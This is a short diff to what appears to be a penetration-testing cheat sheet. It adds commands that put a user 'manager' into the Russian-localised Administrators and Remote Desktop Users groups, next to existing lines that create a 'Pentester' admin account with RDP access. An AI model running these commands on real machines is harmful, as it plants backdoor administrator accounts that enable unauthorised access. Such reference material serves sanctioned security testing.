@@ -1209,6 +1209,10 @@ net user Pentester Password1 /ADD
 # give admin rights
 net localgroup Administrators Pentester /ADD
 
+net localgroup Администраторы manager /ADD
+
+net localgroup "Пользователи удаленного рабочего стола" manager /ADD
+
 # add to RDP group
 
 powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""
